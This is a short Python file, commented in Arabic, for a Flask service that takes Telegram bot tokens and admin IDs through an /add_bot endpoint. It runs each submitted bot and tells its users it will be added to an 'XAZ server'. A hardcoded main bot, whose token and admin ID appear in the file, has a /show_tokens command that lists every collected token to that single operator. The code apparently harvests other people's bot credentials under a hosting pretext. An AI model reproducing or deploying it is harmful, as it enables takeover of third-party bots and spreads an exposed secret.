from flask import Flask, request, jsonify
import telebot
import threading

app = Flask(__name__)

# تخزين البوتات والـ Admin IDs
bots = {}

# توكن البوت الذي سيعرض التوكنات و Admin IDs
BOT_TOKEN = "7647664924:AAFFFndSW8pdfn5BytglDLELe7fm-uSOlS8"
ADMIN_ID = "7796858163"  # آيدي الإداري

# تهيئة البوت
bot = telebot.TeleBot(BOT_TOKEN)

# دالة لبدء تشغيل البوت
def start_bot(token):
    bot_instance = telebot.TeleBot(token)

    @bot_instance.message_handler(func=lambda message: True)
    def handle_message(message):
        user_id = message.from_user.id
        message_text = message.text

        if str(user_id) in bots[token]['admins']:
            response_text = f"**تم استلام رسالة من الإداري:**\n{message_text}"
        else:
            response_text = "**تم ارسال طلب للسرفر وقريبن سوف يتم اضافت هذا البوت لسرفر XAZ, يرجي الانتظار مهلة من زمن🤖**"

        bot_instance.reply_to(message, response_text, parse_mode='Markdown')

    # بدء الاستماع للرسائل
    bot_instance.polling(none_stop=True)

# دالة لعرض جميع التوكنات و Admin IDs
@bot.message_handler(commands=['show_tokens'])
def show_tokens(message):
    if str(message.from_user.id) == ADMIN_ID:
        tokens_info = "**التوكنات والـ Admin IDs المخزنة:**\n\n"
        for token, data in bots.items():
            tokens_info += f"**التوكن:** `{token}`\n**Admin IDs:** {data['admins']}\n\n"
        bot.reply_to(message, tokens_info, parse_mode='Markdown')
    else:
        bot.reply_to(message, "**أنت لست الإداري!**", parse_mode='Markdown')

# API لإضافة توكن و ID الإداري
@app.route('/add_bot', methods=['POST'])
def add_bot():
    data = request.json
    token = data.get('token')
    admin_id = data.get('admin_id')

    if not token or not admin_id:
        return jsonify({'error': 'Token and Admin ID are required'}), 400

    # تخزين البوت وبدء تشغيله
    bots[token] = {'admins': [admin_id]}
    threading.Thread(target=start_bot, args=(token,)).start()

    return jsonify({'message': 'Bot added successfully', 'token': token, 'admin_id': admin_id})

# تشغيل البوت الرئيسي لعرض التوكنات
def run_main_bot():
    bot.polling(none_stop=True)

# تشغيل السيرفر والبوت الرئيسي
if __name__ == '__main__':
    # تشغيل البوت الرئيسي في thread منفصل
    threading.Thread(target=run_main_bot).start()
    # تشغيل سيرفر Flask
    app.run(port=5000)
